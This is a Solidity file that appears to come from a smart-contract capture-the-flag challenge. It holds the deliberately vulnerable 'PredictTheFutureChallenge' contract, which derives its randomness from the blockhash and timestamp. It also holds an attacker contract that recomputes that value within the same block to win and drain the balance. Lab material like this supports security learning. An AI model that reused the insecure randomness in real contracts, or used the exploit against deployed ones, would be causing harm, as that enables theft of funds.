pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeAttacker {
    address private owner;
    PredictTheFutureChallenge target;

    function PredictTheFutureChallengeAttacker(address _target) public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;

        target = PredictTheFutureChallenge(_target);

        target.lockInGuess.value(1 ether)(0);
    }

    function tryAttack() public {
        require(msg.sender == owner);
        
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        require(answer == 0);

        target.settle();

        require(target.isComplete());
    }

    function withdraw() public {
        require(msg.sender == owner);
        address(owner).transfer(address(this).balance);
    }

    function() public payable {}
}